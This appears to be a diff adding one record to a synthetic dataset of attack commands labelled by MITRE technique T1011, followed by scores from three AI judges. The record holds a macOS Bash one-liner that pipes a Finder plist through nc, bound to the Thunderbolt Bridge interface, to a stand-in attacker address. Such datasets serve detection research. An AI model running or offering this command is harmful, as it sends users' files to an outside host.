@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "cat /Users/$USER/Library/Preferences/com.apple.finder.plist | nc -s \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.88 58231",
+  "explanation": "Transfers data by binding TCP to the Thunderbolt Bridge interface, ensuring use of an alternate medium under T1011.",
+  "rationale_steps": [
+    "Identify Thunderbolt Bridge IP via networksetup",
+    "Bind source address to that interface",
+    "Send data to an uncommon destination port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-175e537d",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting and parentheses, valid flags, and a correctly structured subshell and pipeline.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates data via nc bound to the Thunderbolt Bridge IP (aligning with T1011), but success depends on that interface having an IP and appropriate routing/reachability (the 198.51.100.88 target and interface state), so it does not guarantee use of the alternate medium.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2025-09-30T23:58:04.823819Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct use of command substitution.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements exfiltration over an alternate network medium (Thunderbolt Bridge) as described in T1011, though it assumes the Thunderbolt Bridge is configured and active which may not always be the case.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-09-30T23:58:09.109291Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags for `cat`, `nc`, `networksetup`, and `awk`, and correct command substitutions.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately attempts to exfiltrate data by binding the `nc` connection to a specific IP address obtained from the 'Thunderbolt Bridge' interface, directly aligning with the technique's intent of using an alternate network medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-09-30T23:58:24.917083Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
